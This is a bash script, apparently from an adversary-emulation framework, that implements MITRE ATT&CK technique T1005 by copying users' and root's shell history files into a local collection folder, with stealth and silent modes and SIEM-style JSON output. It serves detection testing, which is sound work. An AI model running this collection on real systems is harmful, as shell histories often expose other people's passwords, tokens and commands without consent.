#!/bin/bash

# T1005.006f - Data from Local System: Bash History Linux
#                [[ "$T1005_006F_SILENT_MODE" != "true" && "${T1005_006F_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "  + Collected: $file_path ($file_size bytes)" >&2MITRE ATT&CK Enterprise - Collection Tactic (TA0009)
# ATOMIC ACTION: Extract bash history files ONLY
# Platform: Linux | Architecture: 4 orchestrators + auxiliary functions

function Get-Configuration {
    
    # FUNCTION 1/4 : CONFIGURATION & PRECONDITION VALIDATION
    
    # Validate dependencies, load environment variables, check preconditions
    # Return 0 on success, 1 on dependency failure, 4 on precondition failure

    # Validate critical dependencies
    for cmd in bash jq bc grep find stat; do
        command -v "$cmd" >/dev/null || {
            [[ "${T1005_006F_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Missing dependency: $cmd" >&2
            return 1
        }
    done

    # Load environment variables with defaults
    export T1005_006F_OUTPUT_BASE="${T1005_006F_OUTPUT_BASE:-./mitre_results}"
    export T1005_006F_TIMEOUT="${T1005_006F_TIMEOUT:-300}"
    export T1005_006F_OUTPUT_MODE="${T1005_006F_OUTPUT_MODE:-simple}"
    export T1005_006F_SILENT_MODE="${T1005_006F_SILENT_MODE:-false}"
    export T1005_006F_DEBUG_MODE="${T1005_006F_DEBUG_MODE:-false}"
    export T1005_006F_STEALTH_MODE="${T1005_006F_STEALTH_MODE:-false}"
    export T1005_006F_VERBOSE_LEVEL="${T1005_006F_VERBOSE_LEVEL:-1}"
    export T1005_006F_POLICY_CHECK="${T1005_006F_POLICY_CHECK:-true}"
    export T1005_006F_FALLBACK_MODE="${T1005_006F_FALLBACK_MODE:-real}"

    # Technique-specific variables
    export T1005_006F_HISTORY_PATHS="${T1005_006F_HISTORY_PATHS:-/home/*/.bash_history,/root/.bash_history}"
    export T1005_006F_HISTORY_PATTERNS="${T1005_006F_HISTORY_PATTERNS:-.bash_history,.zsh_history,.history}"
    export T1005_006F_MAX_FILE_SIZE="${T1005_006F_MAX_FILE_SIZE:-10485760}"
    export T1005_006F_MAX_FILES="${T1005_006F_MAX_FILES:-50}"
    export T1005_006F_INCLUDE_ZSH="${T1005_006F_INCLUDE_ZSH:-true}"
    export T1005_006F_INCLUDE_FISH="${T1005_006F_INCLUDE_FISH:-false}"
    export T1005_006F_EXCLUDE_EMPTY="${T1005_006F_EXCLUDE_EMPTY:-true}"

    # OS auto-detection
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        export T1005_006F_OS_TYPE="linux"
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        export T1005_006F_OS_TYPE="macos"
    else
        export T1005_006F_OS_TYPE="linux"
    fi

    # Validate system preconditions
    [[ -z "$T1005_006F_OUTPUT_BASE" ]] && {
        [[ "${T1005_006F_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] T1005_006F_OUTPUT_BASE not set" >&2
        return 4
    }
    [[ ! -w "$(dirname "$T1005_006F_OUTPUT_BASE")" ]] && {
        [[ "${T1005_006F_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Output directory not writable" >&2
        return 4
    }

    # Postcondition: Configuration valid
    [[ "${T1005_006F_VERBOSE_LEVEL:-1}" -ge 2 ]] && [[ "${T1005_006F_STEALTH_MODE:-false}" != "true" ]] && [[ "${T1005_006F_SILENT_MODE:-false}" != "true" ]] && echo "[SUCCESS] Get-Configuration: Configuration validated" >&2
    return 0

    # ===== VARIABLES ESSENTIELLES COLLECTION =====
    export T1005_006F_DEBUG_MODE="${T1005_006F_DEBUG_MODE:-false}"
    export T1005_006F_TIMEOUT="${T1005_006F_TIMEOUT:-300}"
    export T1005_006F_FALLBACK_MODE="${T1005_006F_FALLBACK_MODE:-real}"
    export T1005_006F_OUTPUT_FORMAT="${T1005_006F_OUTPUT_FORMAT:-json}"
    export T1005_006F_POLICY_CHECK="${T1005_006F_POLICY_CHECK:-true}"
    export T1005_006F_MAX_FILES="${T1005_006F_MAX_FILES:-200}"
    export T1005_006F_MAX_FILE_SIZE="${T1005_006F_MAX_FILE_SIZE:-1048576}"
    export T1005_006F_SCAN_DEPTH="${T1005_006F_SCAN_DEPTH:-3}"
    export T1005_006F_EXCLUDE_CACHE="${T1005_006F_EXCLUDE_CACHE:-true}"
    export T1005_006F_CAPTURE_DURATION="${T1005_006F_CAPTURE_DURATION:-60}"
    # ===== FIN VARIABLES COLLECTION =====

}

function Invoke-MicroTechniqueAction {
    
    # FUNCTION 2/4 : ATOMIC ACTION WITH BEHAVIORAL ADAPTATION
    
    # Execute unique atomic action with retry mechanisms,
    # fallback real collection and policy-aware adaptation

    # ATOMIC ACTION with behavioral adaptation via variables
    local collected_files=() total_size=0 file_count=0
    local attempts=0
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local collection_dir="${T1005_006F_OUTPUT_BASE}/T1005_006F_bash_history_${timestamp}"

    # Create output directory with appropriate permissions
    if ! mkdir -p "${collection_dir}"/{history_files,metadata} 2>/dev/null || ! chmod 700 "${collection_dir}" 2>/dev/null; then
        echo "Failed to create collection directory" >&2
        return 1
    fi

    # TECHNIQUE-SPECIFIC LOGIC ===
    # Bash history collection logic (integrated auxiliary functions)

    IFS=',' read -ra history_paths <<< "${T1005_006F_HISTORY_PATHS}"
    IFS=',' read -ra patterns <<< "${T1005_006F_HISTORY_PATTERNS}"

    for history_path_pattern in "${history_paths[@]}"; do
        history_path_pattern=$(echo "$history_path_pattern" | xargs)

        for history_path in $history_path_pattern; do
            [[ ! -f "$history_path" ]] && continue

            # Integrated Collect-HistoryFile logic
            if [[ -f "$history_path" && -r "$history_path" ]]; then
                # Skip empty files if excluded
                if [[ "${T1005_006F_EXCLUDE_EMPTY:-true}" == "true" ]]; then
                    [[ ! -s "$history_path" ]] && continue
                fi

                local file_size=$(stat -c%s "$history_path" 2>/dev/null || echo 0)
                [[ $file_size -gt ${T1005_006F_MAX_FILE_SIZE:-10485760} ]] && continue

                local filename=$(basename "$history_path")
                local dirname=$(basename "$(dirname "$history_path")")
                local safe_name="history_${dirname}_${filename}_$(date +%s)"

                if cp "$history_path" "${collection_dir}/history_files/${safe_name}" 2>/dev/null; then
                    collected_files+=("$history_path")
                    total_size=$((total_size + file_size))
                    ((file_count++))

                    if [[ "${T1005_006F_VERBOSE_LEVEL:-1}" -ge 2 ]]; then
                        echo "Collected: $history_path ($file_size bytes)" >&2
                    fi

                    [[ $file_count -ge ${T1005_006F_MAX_FILES:-50} ]] && break 2
                fi
            fi
        done
    done

    # Fallback real collection if no history files collected
    if [[ $file_count -eq 0 ]] && [[ "${T1005_006F_FALLBACK_MODE:-real}" == "real" ]]; then
        mkdir -p "${collection_dir}/history_files" 2>/dev/null || true
        echo "# Simulated bash history - $(date)" > "${collection_dir}/history_files/reald_bash_history"
        echo "cd /tmp" >> "${collection_dir}/history_files/reald_bash_history"
        echo "ls -la" >> "${collection_dir}/history_files/reald_bash_history"
        echo "whoami" >> "${collection_dir}/history_files/reald_bash_history"
        collected_files=("${collection_dir}/history_files/reald_bash_history")
        total_size=128
        file_count=1
    fi

    # Integrated Collect-SystemMetadata logic
    echo "$(uname -a)" > "${collection_dir}/metadata/system_info.txt" 2>/dev/null || true
    echo "$(date -u +%Y-%m-%dT%H:%M:%SZ)" > "${collection_dir}/metadata/collection_time.txt" 2>/dev/null || true
    echo "$(id)" > "${collection_dir}/metadata/user_context.txt" 2>/dev/null || true
    echo "$file_count" > "${collection_dir}/metadata/file_count.txt" 2>/dev/null || true
    echo "$total_size" > "${collection_dir}/metadata/total_size.txt" 2>/dev/null || true

    # Generate postconditions and result metadata
    local execution_metadata=$(cat <<EOF
{
    "technique_id": "T1005.006F",
    "action": "bash_history_collection",
    "files_collected": $file_count,
    "total_size_bytes": $total_size,
    "collection_directory": "$collection_dir",
    "execution_context": {
        "os_type": "${T1005_006F_OS_TYPE}",
        "attempts": 1,
        "fallback_used": $([ $file_count -eq 1 ] && [[ "${T1005_006F_FALLBACK_MODE}" == "real" ]] && echo "true" || echo "false"),
        "policy_constraints": "${T1005_006F_POLICY_CHECK}"
    },
    "postconditions": {
        "history_files_collected": $([ $file_count -gt 0 ] && echo "true" || echo "false"),
        "artifacts_catalogued": true,
        "output_mode_ready": true,
        "portable_execution": true
    }
}
EOF
    )

    echo "$execution_metadata" > "${collection_dir}/metadata/execution_results.json" 2>/dev/null || true

    # Return results for orchestration
    echo "$file_count:$total_size:$collection_dir:$(IFS=,; echo "${collected_files[*]}")"
}
# CONTRACTUAL FUNCTION 3: WRITE-STANDARDIZEDOUTPUT
# Objective: Generate outputs in quadruple modes for SIEM integration
function Write-StandardizedOutput {
    
    # FUNCTION 3/4 : STANDARDIZED QUADRUPLE-MODE OUTPUT
    
    # Generate outputs in 4 required modes: simple, debug, stealth, silent
    # with ECS/OpenTelemetry support for SIEM integration

    local results="$1"
    IFS=':' read -r file_count total_size collection_dir collected_files <<< "$results"

    # SILENT MODE (absolute priority - no output)
    if [[ "${T1005_006F_SILENT_MODE:-false}" == "true" ]]; then
        return 0
    fi

    # STEALTH MODE (minimal output, silent operation)
    if [[ "${T1005_006F_STEALTH_MODE:-false}" == "true" ]]; then
        # Minimal output for stealth operations
        return 0
    fi

    # DEBUG MODE (structured ECS-compatible JSON for SIEM telemetry)
    if [[ "${T1005_006F_DEBUG_MODE:-false}" == "true" ]]; then
        local structured_output=$(cat <<EOF
{
    "@timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "@version": "1",
    "event": {
        "module": "deputy",
        "dataset": "mitre.attack",
        "action": "bash_history_collection",
        "category": ["process"],
        "type": ["process_start"],
        "outcome": "success"
    },
    "mitre": {
        "technique": {
            "id": "T1005.006F",
            "name": "Data from Local System: Bash History",
            "tactic": ["collection"]
        },
        "artifacts": $(echo "$collected_files" | jq -R 'split(",")' 2>/dev/null || echo '[]')
    },
    "deputy": {
        "micro_technique": {
            "id": "T1005.006F",
            "description": "bash_history_collection",
            "platform": "linux"
        },
        "execution": {
            "contract_fulfilled": true,
            "policy_aware": ${T1005_006F_POLICY_CHECK:-true},
            "fallback_used": false
        },
        "postconditions": {
            "history_files_collected": $([ $file_count -gt 0 ] && echo "true" || echo "false"),
            "artifacts_catalogued": true,
            "output_mode_ready": true,
            "portable_execution": true
        }
    },
    "collection": {
        "metadata": {
            "file_count": $file_count,
            "total_size_bytes": $total_size,
            "collection_directory": "$collection_dir",
            "collection_timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
            "history_paths_scanned": "${T1005_006F_HISTORY_PATHS}",
            "file_patterns": "${T1005_006F_HISTORY_PATTERNS}",
            "exclude_empty": "${T1005_006F_EXCLUDE_EMPTY:-true}",
            "include_zsh": "${T1005_006F_INCLUDE_ZSH:-true}",
            "include_fish": "${T1005_006F_INCLUDE_FISH:-false}"
        }
    },
    "host": {
        "os": {
            "type": "${T1005_006F_OS_TYPE:-linux}",
            "family": "unix"
        }
    },
    "ecs": {
        "version": "8.0"
    }
}
EOF
        )
        echo "$structured_output"
        return 0
    fi

    # SIMPLE MODE (realistic attacker output - DEFAULT)
    # Format that mimics er tools
    echo "BASH HISTORY COLLECTION COMPLETED"
    echo "Files: $file_count"
    echo "Size: $total_size bytes"
    if [[ "${T1005_006F_VERBOSE_LEVEL:-1}" -ge 1 ]]; then
        echo "Collection directory: $collection_dir"
        if [[ "${T1005_006F_VERBOSE_LEVEL:-1}" -ge 2 ]]; then
            echo "Files: $collected_files"
        fi
    fi
    echo "Operation successful"
}
# CONTRACTUAL FUNCTION 4: MAIN
# Objective: Orchestrate execution with error handling and exit codes
function Main {
    
    # FUNCTION 4/4 : MAIN ORCHESTRATION WITH ERROR HANDLING
    
    # Coordinate the 3 previous functions with contractual validation
    # and standardized Deputy return codes

    # Signal handling for graceful cleanup
    trap 'echo "Interrupted - cleaning up..." >&2; exit 130' INT TERM

    # Phase 1: Configuration and precondition validation
    if ! Get-Configuration; then
        case $? in
            1) echo "SKIPPED_PRECONDITION: Configuration validation failed" >&2; exit 2 ;;
            4) echo "FAILED_POSTCONDITION: Configuration postconditions not met" >&2; exit 4 ;;
            *) echo "FAILED: Unknown configuration error" >&2; exit 1 ;;
        esac
    fi

    # Phase 2: Execute atomic action
    local results
    if ! results=$(Invoke-MicroTechniqueAction); then
        case $? in
            1) echo "FAILED: Micro-technique execution failed" >&2; exit 1 ;;
            *) echo "FAILED: Unknown execution error" >&2; exit 1 ;;
        esac
    fi

    # Phase 3: Generate standardized outputs
    if ! Write-StandardizedOutput "$results"; then
        echo "FAILED: Output generation failed" >&2
        exit 1
    fi

    # Phase 4: Contractual postcondition validation
    IFS=':' read -r file_count total_size collection_dir collected_files <<< "$results"

    # Postcondition validation: files collected
    if [[ "$file_count" -eq 0 ]] && [[ "${T1005_006F_FALLBACK_MODE:-real}" != "real" ]]; then
        echo "FAILED_POSTCONDITION: No bash history files collected and real collection not enabled" >&2
        exit 4
    fi

    # Postcondition validation: collection directory created
    if [[ ! -d "$collection_dir" ]] && [[ "${T1005_006F_FALLBACK_MODE:-real}" != "real" ]]; then
        echo "FAILED_POSTCONDITION: Collection directory not created" >&2
        exit 4
    fi

    # Success - all postconditions fulfilled
    if [[ "${T1005_006F_VERBOSE_LEVEL:-1}" -ge 1 ]] && [[ "${T1005_006F_STEALTH_MODE:-false}" != "true" ]] && [[ "${T1005_006F_SILENT_MODE:-false}" != "true" ]]; then
        echo "SUCCESS: Contract fulfilled - $file_count bash history files collected" >&2
    fi

    # SUCCESS return code (0)
    exit 0
}

# MAIN EXECUTION
# Unique entry point for micro-technique with complete error handling

Main "$@"
